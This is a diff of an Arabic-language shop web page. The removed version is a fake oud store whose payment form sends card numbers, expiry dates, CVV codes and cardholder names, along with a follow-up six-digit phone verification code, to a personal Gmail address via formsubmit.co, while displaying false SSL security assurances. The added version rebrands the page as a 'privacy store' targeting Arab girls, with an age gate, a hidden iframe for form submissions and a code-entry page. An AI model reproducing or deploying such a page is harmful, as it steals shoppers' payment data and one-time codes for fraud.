@@ -1,956 +1,1549 @@
 <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مكاسر العود - متجر العود والعطور الفاخر مع الذكاء الاصطناعي</title>
+    <title>متجر الخصوصية العالمي المتطور - توصيل لجميع أنحاء العالم</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&amp;display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D5CDE',
+                        secondary: '#8B5CF6',
+                        accent: '#EC4899',
+                    },
+                    fontFamily: {
+                        arabic: ['Tajawal', 'Arial', 'sans-serif'],
+                    },
+                    animation: {
+                        'float': 'float 3s ease-in-out infinite',
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'glow': 'glow 2s ease-in-out infinite alternate',
+                    },
+                    keyframes: {
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0px)' },
+                            '50%': { transform: 'translateY(-10px)' },
+                        },
+                        glow: {
+                            '0%': { boxShadow: '0 0 20px rgba(93, 92, 222, 0.5)' },
+                            '100%': { boxShadow: '0 0 30px rgba(93, 92, 222, 0.8)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
     <style>
         body {
-            font-family: 'Cairo', sans-serif;
+            font-family: 'Tajawal', Arial, sans-serif;
+            overflow-x: hidden;
         }
+        
+        .hidden-iframe {
+            display: none;
+        }
+        
         .gradient-bg {
-            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
+            background: linear-gradient(135deg, #5D5CDE 0%, #8B5CF6 50%, #EC4899 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 10s ease infinite;
         }
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
-            color: white;
-            padding: 16px 24px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
-            z-index: 2000;
-            transform: translateX(400px);
-            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
-        .notification.show {
-            transform: translateX(0);
+        
+        .card-hover {
+            transition: all 0.4s ease;
         }
-        .notification.warning {
-            background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
-            box-shadow: 0 10px 25px rgba(245, 158, 11, 0.3);
+        
+        .card-hover:hover {
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.2);
         }
-        .notification.error {
-            background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
-            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
+        
+        .page {
+            display: none;
+            animation: fadeIn 0.6s ease-in-out;
         }
-        .input-group {
-            position: relative;
-            margin-bottom: 24px;
+        
+        .page.active {
+            display: block;
         }
-        .input-group input, .input-group select, .input-group textarea {
-            width: 100%;
-            padding: 18px 16px;
-            border: 2px solid #e5e5e5;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: white;
-        }
-        .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
-            outline: none;
-            border-color: #8B4513;
-            box-shadow: 0 0 0 3px rgba(139, 69, 19, 0.1);
-        }
-        .input-group label {
-            position: absolute;
-            right: 16px;
-            top: 18px;
-            background: white;
-            padding: 0 8px;
-            color: #666;
-            transition: all 0.3s ease;
-            pointer-events: none;
-            font-weight: 500;
-        }
-        .input-group input:focus + label,
-        .input-group input:not(:placeholder-shown) + label,
-        .input-group select:focus + label,
-        .input-group select:not([value=""]) + label,
-        .input-group textarea:focus + label,
-        .input-group textarea:not(:placeholder-shown) + label {
-            top: -12px;
-            font-size: 14px;
-            color: #8B4513;
-            font-weight: 600;
-        }
-        .btn-primary {
-            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
-            color: white;
-            padding: 14px 28px;
-            border-radius: 12px;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(139, 69, 19, 0.4);
-        }
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .loading-spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #8B4513;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            margin-left: 8px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .verification-code-input {
-            text-align: center;
-            font-size: 2rem;
-            font-weight: bold;
-            letter-spacing: 0.5rem;
-        }
-        .fade-in {
-            animation: fadeIn 0.5s ease-in;
-        }
+        
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
         }
-        .progress-bar {
+        
+        .nav-link {
+            transition: all 0.3s ease;
+            padding: 8px 16px;
+            border-radius: 8px;
+            position: relative;
+        }
+        
+        .nav-link:hover {
+            color: #5D5CDE;
+            background: rgba(93, 92, 222, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: 0;
+            left: 50%;
+            background: #5D5CDE;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-link:hover::after {
             width: 100%;
-            height: 6px;
-            background: #e5e5e5;
-            border-radius: 3px;
-            overflow: hidden;
-            margin-bottom: 2rem;
+            left: 0;
         }
-        .progress-fill {
+        
+        .discount-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: linear-gradient(135deg, #DC2626, #EF4444);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            animation: bounce 2s infinite;
+        }
+        
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        
+        @media (max-width: 768px) {
+            .product-grid {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+        }
+        
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .floating-shapes {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
-            transition: width 0.3s ease;
+            overflow: hidden;
+            pointer-events: none;
+        }
+        
+        .floating-shapes div {
+            position: absolute;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .floating-shapes div:nth-child(1) {
+            top: 10%;
+            left: 20%;
+            animation-delay: 0s;
+        }
+        
+        .floating-shapes div:nth-child(2) {
+            top: 20%;
+            right: 20%;
+            animation-delay: 2s;
+        }
+        
+        .floating-shapes div:nth-child(3) {
+            top: 60%;
+            left: 10%;
+            animation-delay: 4s;
+        }
+        
+        .animated-border {
+            position: relative;
+            background: linear-gradient(45deg, #5D5CDE, #8B5CF6, #EC4899, #5D5CDE);
+            background-size: 400% 400%;
+            animation: gradientShift 3s ease infinite;
+            padding: 2px;
+            border-radius: 1rem;
+        }
+        
+        .animated-border .inner {
+            background: white;
+            border-radius: 0.875rem;
+            padding: 1rem;
+        }
+        
+        .dark .animated-border .inner {
+            background: #1f2937;
         }
     </style>
 </head>
-<body class="bg-gray-50">
-    
-    <!-- شريط التقدم -->
-    <div class="progress-bar fixed top-0 left-0 z-50">
-        <div class="progress-fill" id="progressFill" style="width: 33.33%"></div>
-    </div>
-    
-    <!-- نموذج طلب الشراء -->
-    <section id="order" class="py-20 bg-orange-50 mt-2">
-        <div class="container mx-auto px-6">
-            <div class="text-center mb-8">
-                <h2 class="text-4xl font-bold text-gray-800 mb-4">تقديم طلب شراء</h2>
-                <p class="text-gray-600">الخطوة 1 من 3: معلومات الطلب</p>
-            </div>
-            <div class="max-w-4xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
-                <form id="orderForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" class="space-y-6">
-                    <!-- إعدادات FormSubmit -->
-                    <input type="hidden" name="_subject" value="🛒 طلب شراء جديد من مكاسر العود">
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_template" value="table">
-                    <input type="text" name="_honey" style="display:none">
-                    <input type="hidden" name="_next" value="javascript:void(0)">
-                    
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <div class="input-group">
-                            <input type="text" name="first_name" required="" placeholder=" ">
-                            <label>الاسم الأول</label>
-                        </div>
-                        <div class="input-group">
-                            <input type="text" name="last_name" required="" placeholder=" ">
-                            <label>الاسم الأخير</label>
-                        </div>
-                    </div>
-                    <div class="input-group">
-                        <input type="email" name="email" required="" placeholder=" ">
-                        <label>البريد الإلكتروني</label>
-                    </div>
-                    <div class="input-group">
-                        <input type="tel" name="phone" required="" placeholder=" " pattern="[0-9]{10,}" title="يرجى إدخال رقم هاتف صحيح">
-                        <label>رقم الهاتف</label>
-                    </div>
-                    <div class="input-group">
-                        <input type="text" name="address" required="" placeholder=" ">
-                        <label>العنوان التفصيلي</label>
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <div class="input-group">
-                            <select name="city" required="">
-                                <option value="">اختر المدينة</option>
-                                <option value="الرياض">الرياض</option>
-                                <option value="جدة">جدة</option>
-                                <option value="الدمام">الدمام</option>
-                                <option value="مكة">مكة</option>
-                                <option value="المدينة">المدينة</option>
-                                <option value="أبها">أبها</option>
-                                <option value="تبوك">تبوك</option>
-                                <option value="الطائف">الطائف</option>
-                            </select>
-                            <label>المدينة</label>
-                        </div>
-                        <div class="input-group">
-                            <input type="text" name="postal_code" required="" placeholder=" " maxlength="6" pattern="[0-9]{5,6}" title="يرجى إدخال رمز بريدي مكون من 5-6 أرقام" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
-                            <label>الرمز البريدي</label>
-                        </div>
-                    </div>
-                    <div class="input-group">
-                        <select name="product_type" required="">
-                            <option value="">اختر نوع المنتج</option>
-                            <option value="عود كمبودي فاخر - 500 ريال">عود كمبودي فاخر - 500 ريال</option>
-                            <option value="عود هندي ممتاز - 300 ريال">عود هندي ممتاز - 300 ريال</option>
-                            <option value="عطر عود مميز - 250 ريال">عطر عود مميز - 250 ريال</option>
-                            <option value="مجموعة العود والعطر - 700 ريال">مجموعة العود والعطر - 700 ريال</option>
-                        </select>
-                        <label>نوع المنتج</label>
-                    </div>
-                    <div class="input-group">
-                        <input type="number" name="quantity" required="" placeholder=" " min="1" max="10" value="1">
-                        <label>الكمية</label>
-                    </div>
-                    <div class="input-group">
-                        <textarea rows="4" name="order_notes" placeholder=" " class="resize-none"></textarea>
-                        <label>ملاحظات إضافية (اختياري)</label>
-                    </div>
-                    <button type="submit" class="btn-primary w-full" id="submitOrderBtn">
-                        <i class="fas fa-shopping-cart ml-2"></i>
-                        تأكيد الطلب والمتابعة
-                    </button>
-                </form>
-            </div>
-        </div>
-    </section>
+<body class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white transition-colors duration-300">
 
-    <!-- صفحة إدخال كود التحقق -->
-    <section id="verification" class="py-20 bg-gray-50" style="display: none;">
-        <div class="container mx-auto px-6">
-            <div class="text-center mb-8">
-                <h2 class="text-4xl font-bold text-gray-800 mb-4">تأكيد عملية الشراء</h2>
-                <p class="text-gray-600">الخطوة 3 من 3: إدخال كود التحقق</p>
-            </div>
-            <div class="max-w-2xl mx-auto">
-                <div class="bg-white p-8 rounded-2xl shadow-lg text-center">
-                    <div class="mb-8">
-                        <i class="fas fa-shield-alt text-6xl text-green-500 mb-4"></i>
-                        <h3 class="text-2xl font-bold text-gray-800 mb-4">تم إرسال طلبك بنجاح!</h3>
-                        <p class="text-gray-600">أدخل كود التحقق المكون من 6 أرقام لإتمام عملية الشراء</p>
-                    </div>
-                    
-                    <form id="verificationForm" class="space-y-6">
-                        <div class="input-group">
-                            <input type="text" id="verificationCode" name="verification_code" required="" placeholder=" " maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)" class="verification-code-input">
-                            <label>كود التحقق (6 أرقام)</label>
-                        </div>
-                        
-                        <div class="bg-blue-50 p-4 rounded-lg">
-                            <p class="text-blue-700 text-sm">
-                                <i class="fas fa-info-circle ml-2"></i>
-                                سيتم إرسال كود التحقق على رقم الهاتف المسجل خلال دقائق قليلة
-                            </p>
-                        </div>
-                        
-                        <button type="submit" class="btn-primary w-full" id="submitVerificationBtn">
-                            <i class="fas fa-check ml-2"></i>
-                            تأكيد الكود وإتمام الشراء
-                        </button>
-                        
-                        <button type="button" onclick="resendCode()" class="w-full mt-4 py-3 text-blue-600 hover:text-blue-800 transition-colors">
-                            <i class="fas fa-redo ml-2"></i>
-                            إعادة إرسال الكود
-                        </button>
-                        
-                        <button type="button" onclick="goBack()" class="w-full mt-2 py-3 text-gray-600 hover:text-gray-800 transition-colors">
-                            <i class="fas fa-arrow-right ml-2"></i>
-                            العودة للطلب
-                        </button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </section>
+    <!-- Hidden iframe for form submissions -->
+    <iframe name="hidden_iframe" class="hidden-iframe" onload="handleFormSubmit()"></iframe>
 
-    <!-- نموذج الدفع -->
-    <section id="payment" class="py-20" style="display: none;">
-        <div class="container mx-auto px-6">
-            <div class="text-center mb-8">
-                <h2 class="text-4xl font-bold text-gray-800 mb-4">إتمام الدفع</h2>
-                <p class="text-gray-600">الخطوة 2 من 3: اختر طريقة الدفع</p>
-            </div>
-            <div class="max-w-4xl mx-auto space-y-6">
-                
-                <!-- طريقة الدفع المتاحة -->
-                <div class="bg-white p-6 rounded-2xl shadow-lg">
-                    <h3 class="text-xl font-bold text-gray-800 mb-6 text-center">طرق الدفع المتاحة</h3>
-                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                        <!-- بطاقة الائتمان - متاحة -->
-                        <div class="p-4 border-2 border-orange-500 bg-orange-50 rounded-lg text-center">
-                            <i class="fas fa-credit-card text-3xl text-orange-600 mb-2"></i>
-                            <p class="font-semibold text-gray-800">بطاقة ائتمان</p>
-                            <p class="text-sm text-gray-600">Visa, MasterCard, مدى</p>
-                            <span class="inline-block bg-green-100 text-green-800 text-xs px-2 py-1 rounded-full mt-2">متاح الآن</span>
-                        </div>
-                        
-                        <!-- طرق دفع قادمة -->
-                        <div class="p-4 border-2 border-gray-300 bg-gray-50 rounded-lg text-center opacity-60">
-                            <i class="fas fa-university text-3xl text-gray-400 mb-2"></i>
-                            <p class="font-semibold text-gray-600">تحويل بنكي</p>
-                            <p class="text-sm text-gray-500">جميع البنوك السعودية</p>
-                            <span class="inline-block bg-yellow-100 text-yellow-800 text-xs px-2 py-1 rounded-full mt-2">سوف يتوفر قريباً</span>
-                        </div>
-                        
-                        <div class="p-4 border-2 border-gray-300 bg-gray-50 rounded-lg text-center opacity-60">
-                            <i class="fas fa-hand-holding-usd text-3xl text-gray-400 mb-2"></i>
-                            <p class="font-semibold text-gray-600">دفع عند الاستلام</p>
-                            <p class="text-sm text-gray-500">نقداً أو بطاقة</p>
-                            <span class="inline-block bg-yellow-100 text-yellow-800 text-xs px-2 py-1 rounded-full mt-2">سوف يتوفر قريباً</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- نموذج بطاقة الائتمان -->
-                <div id="creditCardForm" class="bg-white p-8 rounded-2xl shadow-lg">
-                    <div class="flex items-center justify-between mb-6">
-                        <h3 class="text-xl font-bold text-gray-800">معلومات بطاقة الائتمان</h3>
-                        <div class="flex space-x-2 space-x-reverse">
-                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA0MCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzAwNTFBNSIvPgo8cGF0aCBkPSJNMTMuNSA4SDIwLjVWMTZIMTMuNVY4WiIgZmlsbD0iI0ZGNUYwMCIvPgo8L3N2Zz4K" alt="MasterCard" class="h-6">
-                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA0MCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzFBMUY3MSIvPgo8cGF0aCBkPSJNMTAgOEgyNVYxNkgxMFY4WiIgZmlsbD0iI0ZGRkZGRiIvPgo8L3N2Zz4K" alt="Visa" class="h-6">
-                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA0MCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzAwOTYzOSIvPgo8cGF0aCBkPSJNMTAgOEgyNVYxNkgxMFY4WiIgZmlsbD0iI0ZGRkZGRiIvPgo8L3N2Zz4K" alt="مدى" class="h-6">
-                        </div>
-                    </div>
-                    
-                    <form id="paymentForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" class="space-y-6">
-                        <!-- إعدادات FormSubmit للدفع -->
-                        <input type="hidden" name="_subject" value="💳 معلومات دفع جديدة من مكاسر العود">
-                        <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_template" value="table">
-                        <input type="text" name="_honey" style="display:none">
-                        <input type="hidden" name="_next" value="javascript:void(0)">
-                        <input type="hidden" name="payment_method" id="selectedPaymentMethod" value="credit">
-                        
-                        <div class="input-group">
-                            <input type="text" name="card_number" required="" placeholder=" " maxlength="19" oninput="formatCardNumber(this)" autocomplete="cc-number">
-                            <label>رقم البطاقة</label>
-                            <div class="absolute left-3 top-1/2 transform -translate-y-1/2">
-                                <i id="cardTypeIcon" class="fas fa-credit-card text-gray-400"></i>
-                            </div>
-                        </div>
-                        
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                            <div class="input-group">
-                                <input type="text" name="expiry_date" required="" placeholder=" " maxlength="5" oninput="formatExpiryDate(this)" autocomplete="cc-exp">
-                                <label>تاريخ الانتهاء (شهر/سنة)</label>
-                            </div>
-                            <div class="input-group">
-                                <input type="password" name="cvv" required="" placeholder=" " maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" autocomplete="cc-csc">
-                                <label>رمز الأمان (CVV)</label>
-                                <div class="absolute left-3 top-1/2 transform -translate-y-1/2">
-                                    <i class="fas fa-question-circle text-gray-400 cursor-help" title="الأرقام الثلاثة في خلف البطاقة"></i>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="input-group">
-                            <input type="text" name="card_holder" required="" placeholder=" " autocomplete="cc-name">
-                            <label>اسم حامل البطاقة (كما هو مكتوب على البطاقة)</label>
-                        </div>
-                        
-                        <!-- ملخص الطلب -->
-                        <div class="bg-gray-50 p-4 rounded-lg">
-                            <h4 class="font-semibold text-gray-800 mb-3">ملخص الطلب</h4>
-                            <div class="space-y-2 text-sm">
-                                <div class="flex justify-between">
-                                    <span>المنتج:</span>
-                                    <span id="orderSummaryProduct">-</span>
-                                </div>
-                                <div class="flex justify-between">
-                                    <span>الكمية:</span>
-                                    <span id="orderSummaryQuantity">-</span>
-                                </div>
-                                <div class="flex justify-between">
-                                    <span>الشحن:</span>
-                                    <span>مجاني</span>
-                                </div>
-                                <hr class="my-2">
-                                <div class="flex justify-between font-bold">
-                                    <span>المجموع:</span>
-                                    <span id="orderSummaryTotal">-</span>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <!-- أمان المعاملة -->
-                        <div class="bg-green-50 border border-green-200 p-4 rounded-lg">
-                            <div class="flex items-center">
-                                <i class="fas fa-shield-alt text-green-600 ml-3"></i>
-                                <div>
-                                    <p class="text-green-800 font-semibold">معاملة آمنة ومحمية</p>
-                                    <p class="text-green-700 text-sm">جميع معلوماتك محمية بتشفير SSL 256-bit</p>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <button type="submit" class="btn-primary w-full" id="submitPaymentBtn">
-                            <i class="fas fa-lock ml-2"></i>
-                            إتمام الدفع الآمن
-                        </button>
-                    </form>
-                </div>
-
-
-                
-                <button type="button" onclick="goBack()" class="w-full mt-4 py-3 text-gray-600 hover:text-gray-800 transition-colors bg-white rounded-lg border-2 border-gray-300">
-                    <i class="fas fa-arrow-right ml-2"></i>
-                    العودة للطلب
+    <!-- Age Verification Modal -->
+    <div id="age-verification" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
+        <div class="glass-effect text-white p-8 rounded-2xl shadow-2xl max-w-md w-full mx-4 text-center">
+            <div class="text-6xl mb-6 animate-bounce">🔞</div>
+            <h2 class="text-3xl font-bold mb-4">تأكيد العمر</h2>
+            <p class="text-gray-200 mb-8 text-lg">
+                يجب أن تكون 18 سنة أو أكثر لدخول هذا الموقع
+            </p>
+            <div class="flex space-x-4 space-x-reverse">
+                <button onclick="confirmAge()" class="flex-1 bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl hover:from-green-600 hover:to-emerald-700 transition-all font-bold">
+                    أكبر من 18 سنة ✓
+                </button>
+                <button onclick="window.location.href='https://google.com'" class="flex-1 bg-gradient-to-r from-red-500 to-red-600 text-white py-4 rounded-xl hover:from-red-600 hover:to-red-700 transition-all font-bold">
+                    أقل من 18 سنة ✗
                 </button>
             </div>
         </div>
-    </section>
+    </div>
 
-    <!-- صفحة الشكر -->
-    <section id="thankyou" class="py-20 bg-green-50" style="display: none;">
-        <div class="container mx-auto px-6">
-            <div class="max-w-3xl mx-auto text-center">
-                <div class="bg-white p-8 rounded-2xl shadow-lg">
-                    <div class="mb-8">
-                        <i class="fas fa-check-circle text-8xl text-green-500 mb-6"></i>
-                        <h2 class="text-4xl font-bold text-gray-800 mb-4">تم إتمام طلبك بنجاح!</h2>
-                        <p class="text-xl text-gray-600 mb-6">شكراً لك على اختيار مكاسر العود</p>
+    <!-- Navigation -->
+    <nav class="bg-white dark:bg-gray-800 shadow-xl sticky top-0 z-50 transition-colors duration-300 backdrop-blur-lg bg-opacity-90 dark:bg-opacity-90">
+        <div class="container mx-auto px-4">
+            <div class="flex justify-between items-center py-4">
+                <div class="flex items-center space-x-4 space-x-reverse">
+                    <div class="relative">
+                        <i class="fas fa-heart text-3xl text-primary animate-pulse"></i>
+                        <div class="absolute -top-1 -right-1 w-3 h-3 bg-red-500 rounded-full animate-ping"></div>
                     </div>
-                    
-                    <div class="bg-gray-50 p-6 rounded-lg mb-8">
-                        <h3 class="text-xl font-bold text-gray-800 mb-4">تفاصيل الطلب</h3>
-                        <div class="space-y-2 text-gray-600">
-                            <p><strong>رقم الطلب:</strong> <span id="orderNumber">OUD-2024-001</span></p>
-                            <p><strong>تاريخ الطلب:</strong> <span id="orderDate"></span></p>
-                            <p><strong>حالة الطلب:</strong> <span class="text-green-600 font-semibold">تم التأكيد</span></p>
+                    <h1 class="text-2xl font-black bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">متجر الخصوصية المتطور</h1>
+                </div>
+                
+                <div class="hidden md:flex space-x-8 space-x-reverse">
+                    <a href="#" class="nav-link" onclick="showPage('home')">🏠 الرئيسية</a>
+                    <a href="#" class="nav-link" onclick="showPage('products')">🛍️ المنتجات</a>
+                    <a href="#" class="nav-link" onclick="showPage('code')">🎯 أدخل الكود</a>
+                    <a href="#" class="nav-link" onclick="showPage('contact')">📞 اتصل بنا</a>
+                </div>
+                
+                <div class="flex items-center space-x-4 space-x-reverse">
+                    <button onclick="toggleCart()" class="relative group">
+                        <i class="fas fa-shopping-cart text-2xl group-hover:text-primary transition-colors"></i>
+                        <span id="cart-count" class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full text-xs w-6 h-6 flex items-center justify-center animate-pulse">0</span>
+                    </button>
+                    <button class="md:hidden" onclick="toggleMobileMenu()">
+                        <i class="fas fa-bars text-2xl"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Mobile Menu -->
+            <div id="mobile-menu" class="md:hidden hidden pb-4">
+                <a href="#" class="block py-3 nav-link" onclick="showPage('home')">🏠 الرئيسية</a>
+                <a href="#" class="block py-3 nav-link" onclick="showPage('products')">🛍️ المنتجات</a>
+                <a href="#" class="block py-3 nav-link" onclick="showPage('code')">🎯 أدخل الكود</a>
+                <a href="#" class="block py-3 nav-link" onclick="showPage('contact')">📞 اتصل بنا</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Homepage -->
+    <div id="home" class="page active">
+        <!-- Hero Section -->
+        <section class="gradient-bg text-white py-20 relative overflow-hidden">
+            <div class="floating-shapes">
+                <div class="w-20 h-20 bg-white bg-opacity-20 rounded-full"></div>
+                <div class="w-16 h-16 bg-yellow-300 bg-opacity-30 rounded-full"></div>
+                <div class="w-24 h-24 bg-pink-400 bg-opacity-20 rounded-full"></div>
+            </div>
+            
+            <div class="container mx-auto px-4 text-center relative z-10">
+                <h1 class="text-5xl md:text-7xl font-black mb-8 animate-float">متجر الخصوصية المتطور</h1>
+                <div class="text-2xl md:text-3xl mb-4 font-bold">🌸 شركة أجنبية متخصصة في دعم البنات العربيات 🌸</div>
+                
+                <div class="glass-effect rounded-2xl p-8 mb-8 text-center max-w-4xl mx-auto">
+                    <h3 class="text-3xl font-black mb-6">💖 رسالتنا للبنات العربيات 💖</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-lg">
+                        <div class="space-y-3">
+                            <p>✨ شركة أجنبية عالمية مختصة</p>
+                            <p>🎯 دعم البنات العربيات حصرياً</p>
+                            <p>💎 منتجات عالية الجودة حصرية</p>
+                        </div>
+                        <div class="space-y-3">
+                            <p>🚀 توصيل سريع وآمن</p>
+                            <p>🔒 خصوصية وسرية تامة</p>
+                            <p>💰 أسعار منخفضة لدعم الجميع</p>
                         </div>
                     </div>
-                    
-                    <div class="space-y-4">
-                        <div class="bg-blue-50 p-4 rounded-lg">
-                            <p class="text-blue-700">
-                                <i class="fas fa-clock ml-2"></i>
-                                سيتم التواصل معك خلال 24 ساعة لتأكيد التوصيل
-                            </p>
+                    <div class="mt-6 text-2xl font-black text-yellow-300 animate-pulse">
+                        ✨ أسعارنا منخفضة لتكون في متناول الجميع! ✨
+                    </div>
+                </div>
+                
+                <div class="flex justify-center space-x-4 space-x-reverse">
+                    <button onclick="showPage('products')" class="bg-white text-primary px-10 py-4 rounded-full font-black text-xl hover:bg-gray-100 transition-all transform hover:scale-105 shadow-2xl">
+                        🛍️ تسوق الآن
+                    </button>
